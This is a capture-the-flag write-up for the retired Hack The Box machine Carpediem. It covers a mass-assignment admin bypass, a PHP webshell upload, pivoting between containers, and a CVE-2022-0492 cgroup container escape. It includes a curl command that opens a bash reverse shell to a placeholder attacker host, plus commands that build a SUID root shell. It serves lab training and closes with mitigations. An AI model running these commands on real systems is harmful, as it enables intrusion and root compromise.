---
machine: Carpediem
os: Linux
difficulty: Hard
platform: Hack The Box
state: Retired
tags: [linux, web, docker, pivot, cms, upload, cgroups]
---

# Carpediem — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

The portal allows changing `login_type` through mass assignment and uploading a webshell. From the container, internal services are enumerated, a Trudesk ticket leaks voicemail access and `tcpdump` captures traffic. The second phase compromises Backdrop CMS and escapes the container with CVE-2022-0492.

## Recon

```bash
nmap -Pn -sCV -p22,80 <IP>
```

- `22/tcp` OpenSSH on Ubuntu 20.04 and `80/tcp` nginx serving a “coming soon” landing page.
- The `portal.carpediem.htb` vhost hosts a PHP motorcycle rental application.
- `config.php` points to a MySQL database and the host is a Docker container.

## Enumeration

- The `update_account` POST accepts `id`, `login_type` and other hidden fields.
- Changing `login_type` from `2` to `1` grants access to `/admin`.
- Report uploads use `multipart/form-data` and return the file path; the filename is preserved with a numeric prefix.

## Foothold

Upload a PHP file that runs `$_GET['cmd']` and visit the returned path. The shell lands as `www-data` inside the portal container.

```bash
curl -G --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/<ATTACKER>/443 0>&1"'   http://portal.carpediem.htb/uploads/<FILE>.php
```

From there, read `initialize.php` and the MySQL credentials, then enumerate the containers on `172.17.0.0/24`.

## Lateral movement

A Trudesk ticket describes a new employee and how their password arrives by voicemail. Access the VoIP portal, listen to the message and recover `hflaccus`'s password for SSH on the host. Then `tcpdump` with capabilities captures CMS traffic and reveals Backdrop credentials.

## Privilege escalation

With the Backdrop credentials, upload a malicious PHP plugin and run it as the container user. The container has `CAP_SYS_ADMIN` and a mounted cgroup v1; CVE-2022-0492 writes to `release_agent` and runs a command on the host as root.

```bash
# Check the mount and capability
mount | grep cgroup
capsh --print | grep sys_admin

# Create the payload and trigger release_agent
echo '#!/bin/sh' > /tmp/x
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /tmp/x
chmod +x /tmp/x
# Write release_agent and empty the cgroup
```

## Evidence

- `/admin` access after changing `login_type`.
- Webshell under `/uploads/` and a shell as `www-data`.
- `tcpdump` capture with Backdrop credentials and `/tmp/rootbash` with SUID.

## Lessons learned

- A hidden field such as `login_type` is not an authorization control.
- Containers with `CAP_SYS_ADMIN` and cgroup v1 enable known escapes.
- Unencrypted internal traffic exposes reusable credentials.

## Mitigation and detection

- Validate roles server-side and never trust client-supplied fields.
- Run containers without `CAP_SYS_ADMIN` and with cgroup v2.
- Segment the container network and encrypt internal traffic.

## References

- [0xdf — Carpediem](https://0xdf.gitlab.io/2022/12/03/htb-carpediem.html)
- [IppSec — Carpediem](https://www.youtube.com/watch?v=piTtOe13SEU)
- [Hack The Box — Carpediem](https://app.hackthebox.com/machines/carpediem)
